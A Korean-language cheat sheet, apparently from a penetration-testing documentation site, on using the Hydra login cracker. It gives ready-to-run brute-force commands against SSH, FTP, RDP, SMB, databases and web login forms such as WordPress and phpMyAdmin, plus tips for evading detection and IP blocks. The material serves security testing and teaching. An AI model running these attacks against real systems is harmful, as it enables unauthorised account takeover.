---
sidebar_position: 2
---

# Hydra

강력한 네트워크 로그인 크래커입니다.

## 설치

```bash
# Kali Linux
sudo apt install hydra

# 또는
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
make install
```

## 기본 사용법

```bash
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L <USER_LIST> -P <PASS_LIST> <PROTOCOL>
hydra <RHOST> -C <COMBO_FILE> <PROTOCOL>
```

## 프로토콜별 예제

### SSH

```bash
# 단일 사용자/비밀번호
hydra -l root -p password ssh://<RHOST>

# 워드리스트 사용
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<RHOST>
hydra -L users.txt -P passwords.txt ssh://<RHOST>

# 포트 지정
hydra -l root -P wordlist.txt ssh://<RHOST>:2222
```

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>
hydra -L users.txt -P passwords.txt ftp://<RHOST>

# Combo 파일 (username:password 형식)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<RHOST>
```

### RDP

```bash
hydra -l administrator -P passwords.txt rdp://<RHOST>
hydra -L users.txt -P passwords.txt rdp://<RHOST>
```

### SMB

```bash
hydra -l administrator -P passwords.txt smb://<RHOST>
hydra -L users.txt -P passwords.txt smb://<RHOST>
```

### MySQL

```bash
hydra -l root -P passwords.txt mysql://<RHOST>
hydra -L users.txt -P passwords.txt mysql://<RHOST>
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://<RHOST>
```

### MSSQL

```bash
hydra -l sa -P passwords.txt mssql://<RHOST>
```

### VNC

```bash
hydra -P passwords.txt vnc://<RHOST>
```

### Telnet

```bash
hydra -l admin -P passwords.txt telnet://<RHOST>
```

## HTTP/HTTPS 폼 공격

### HTTP POST Form

```bash
# 기본 형식
hydra <RHOST> -l <USERNAME> -P <WORDLIST> http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# 실제 예제
hydra <RHOST> -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"

hydra <RHOST> -l admin -P passwords.txt http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"

hydra <RHOST> -L users.txt -P passwords.txt http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>

# 성공 메시지로 판별 (S= 사용)
hydra <RHOST> -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

### HTTP GET Form

```bash
hydra <RHOST> -l admin -P passwords.txt http-get-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

### HTTPS

```bash
hydra <RHOST> -l admin -P passwords.txt https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
```

### 복잡한 폼 (ViewState, CSRF 토큰 등)

```bash
# ASP.NET ViewState 예제
hydra <RHOST> -l admin -P passwords.txt http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"

# OTRS 예제
hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
```

## HTTP 기본 인증

```bash
hydra -l admin -P passwords.txt http-get://<RHOST>/admin
hydra -l admin -P passwords.txt <RHOST> http-get /admin
```

## 옵션

```bash
-l <USERNAME>         # 단일 사용자명
-L <USER_FILE>        # 사용자명 리스트
-p <PASSWORD>         # 단일 비밀번호
-P <PASS_FILE>        # 비밀번호 리스트
-C <COMBO_FILE>       # user:pass 조합 파일
-s <PORT>             # 포트 지정
-t <THREADS>          # 스레드 수 (기본 16)
-f                    # 첫 성공 시 종료
-F                    # 호스트당 첫 성공 시 종료
-v                    # Verbose 모드
-V                    # 매우 Verbose (시도마다 표시)
-o <FILE>             # 결과 출력 파일
-I                    # 기존 세션 무시하고 재시작
-R                    # 이전 세션 복구
-w <TIME>             # 응답 대기 시간 (초)
-W <TIME>             # 연결 대기 시간 (초)
-e nsr                # n=null, s=login as pass, r=reversed login
-u                    # 사용자별 순회 (기본은 비밀번호별)
-M <FILE>             # 서버 리스트
```

## 유용한 테크닉

### 빈 비밀번호 테스트

```bash
hydra -l admin -e n ssh://<RHOST>
```

### 사용자명을 비밀번호로 테스트

```bash
hydra -L users.txt -e s ssh://<RHOST>
```

### 역순 사용자명 테스트

```bash
hydra -L users.txt -e r ssh://<RHOST>
```

### 모든 조합

```bash
hydra -L users.txt -e nsr -P passwords.txt ssh://<RHOST>
```

### 사용자별 순회 (느리지만 탐지 회피)

```bash
hydra -L users.txt -P passwords.txt -u ssh://<RHOST>
```

### 스레드 조절

```bash
# 빠르게 (탐지 가능성 높음)
hydra -l admin -P passwords.txt -t 64 ssh://<RHOST>

# 느리게 (탐지 회피)
hydra -l admin -P passwords.txt -t 4 ssh://<RHOST>
```

### 여러 호스트 동시 공격

```bash
# hosts.txt 파일 생성
cat > hosts.txt << EOF
192.168.1.10
192.168.1.11
192.168.1.12
EOF

# 공격
hydra -M hosts.txt -l admin -P passwords.txt ssh
```

### 프록시 사용

```bash
# 환경변수 설정
export HYDRA_PROXY=connect://127.0.0.1:8080
hydra -l admin -P passwords.txt ssh://<RHOST>

# 해제
unset HYDRA_PROXY
```

### 결과 저장

```bash
hydra -l admin -P passwords.txt ssh://<RHOST> -o results.txt
```

### 세션 복구

```bash
# Ctrl+C로 중단 시 .restore 파일 생성
# 복구
hydra -R
```

## 실제 시나리오

### WordPress 로그인

```bash
hydra <RHOST> -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -t 30
```

### phpMyAdmin

```bash
hydra <RHOST> -l root -P passwords.txt http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=denied"
```

### SSH 브루트포스

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<RHOST> -t 4 -V
```

### FTP 익명 로그인 확인

```bash
hydra -l anonymous -p anonymous ftp://<RHOST>
```

## HTTP Form 구조 분석

### Burp Suite로 요청 캡처

1. 로그인 시도를 Burp Suite로 캡처
2. POST 데이터 확인: `username=admin&password=test`
3. 실패 메시지 확인: "Invalid credentials"

### Hydra 명령 구성

```bash
hydra <RHOST> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

형식:
```
"/경로:POST데이터:F=실패메시지"
또는
"/경로:POST데이터:S=성공메시지"
```

## 지원 프로토콜

```bash
adam6500, afp, asterisk, cisco, cisco-enable, cobaltstrike, 
cvs, firebird, ftp, ftps, http-get, http-head, http-post, 
http-post-form, http-get-form, http-proxy, http-proxy-urlenum, 
https-get, https-head, https-post, https-post-form, https-get-form, 
imap, imaps, irc, ldap2, ldap2s, ldap3, ldap3-crammd5, 
ldap3-crammd5s, ldap3-digestmd5, ldap3-digestmd5s, ldap3s, 
memcached, mongodb, mssql, mysql, nntp, oracle, oracle-listener, 
oracle-sid, pcanywhere, pcnfs, pop3, pop3s, postgres, radmin2, 
rdp, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, sapr3, 
sip, smb, smtp, smtps, smtp-enum, snmp, socks5, ssh, sshkey, 
svn, teamspeak, telnet, telnets, vmauthd, vnc, xmpp
```

## 참고

- 항상 권한이 있는 시스템에서만 사용
- `-t` 스레드 수가 높을수록 빠르지만 탐지 쉬움
- `-f` 옵션으로 첫 성공 시 즉시 종료
- HTTP 폼 공격 시 실패/성공 메시지 정확히 파악 필요
- `^USER^`와 `^PASS^`는 자리표시자
- `-V` 옵션으로 각 시도 확인 가능
- 프록시 사용으로 IP 차단 우회 가능
- Combo 파일 형식: `username:password` (한 줄에 하나)
